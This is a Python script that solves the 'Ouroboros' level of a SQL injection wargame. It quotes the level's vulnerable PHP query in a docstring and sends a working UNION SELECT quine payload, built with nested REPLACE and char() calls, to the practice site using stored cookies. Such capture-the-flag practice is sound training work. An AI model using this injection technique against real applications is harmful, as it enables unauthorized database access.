#!/usr/bin/env python3
import los
import los_cookies as lc


def main():
    """
    Ouroboros 30

    if(preg_match('/prob|_|\.|rollup|join|@/i', $_GET['pw'])) exit("No Hack ~_~");
    $query = "select pw from prob_ouroboros where pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['pw']) echo "<h2>Pw : {$result[pw]}</h2>";
    if(($result['pw']) && ($result['pw'] === $_GET['pw'])) solve("ouroboros");
    """

    url = "https://los.rubiya.kr/chall/ouroboros_e3f483f087c922c84373b49950c212a9.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'

    param = {'pw': "' union select replace(replace('" +
             "\" union select replace(replace(" +
             "\"$\",char(34),char(39)),char(36),\"$\")" +
             " as quine#',char(34),char(39)),char(36),'\" union select replace" +
             "(replace(\"$\",char(34),char(39)),char(36),\"$\")" +
             " as quine#') as quine#"
             }

    p = los.SqlInjection(url, cook, method, inj_param, param['pw'])

    response = p.my_request()
    if 'Clear!' in response:
        print('\nOuroboros Clear!')


if __name__ == '__main__':
    main()

